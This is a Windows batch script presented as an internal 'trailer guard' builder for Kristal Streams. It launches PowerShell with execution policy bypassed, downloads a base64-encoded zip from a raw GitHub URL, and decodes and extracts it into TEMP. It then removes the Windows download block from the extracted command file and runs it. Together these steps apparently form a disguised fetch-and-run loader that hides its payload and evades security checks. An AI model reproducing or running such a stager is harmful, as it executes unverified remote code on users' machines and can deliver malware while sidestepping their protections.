@echo off
setlocal EnableExtensions
title Kristal Streams Internal Trailer Guard 1682048 R3

echo.
echo ==========================================================
echo   KRISTAL STREAMS INTERNAL TRAILER GUARD 1682048 R3
echo ==========================================================
echo.
echo Downloading the verified full-code Windows builder...

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$ErrorActionPreference='Stop'; $root=Join-Path $env:TEMP 'ks-1682048-trailer-r3'; $b64=$root+'.b64'; $zip=$root+'.zip'; $dir=$root+'-files'; Remove-Item $b64,$zip -Force -ErrorAction SilentlyContinue; Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/djudge47/kristalstreams/5b0345769306fcc5c5b49ae4c1a82736b63e939b/kristalstreams-1682048-r3.zip.b64' -OutFile $b64; [IO.File]::WriteAllBytes($zip,[Convert]::FromBase64String([IO.File]::ReadAllText($b64))); Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force; $builder=Join-Path $dir 'KS-INTERNAL-TRAILER-GUARD-1682048.cmd'; if(-not (Test-Path -LiteralPath $builder)){throw 'Full-code trailer-guard R3 builder was not found after extraction'}; Unblock-File $builder; & $builder; if($LASTEXITCODE){exit $LASTEXITCODE}"

if errorlevel 1 (
    color 4F
    echo.
    echo ERROR: The full-code 1682048 builder could not be downloaded or started.
    echo.
    pause
    exit /b 1
)

exit /b 0
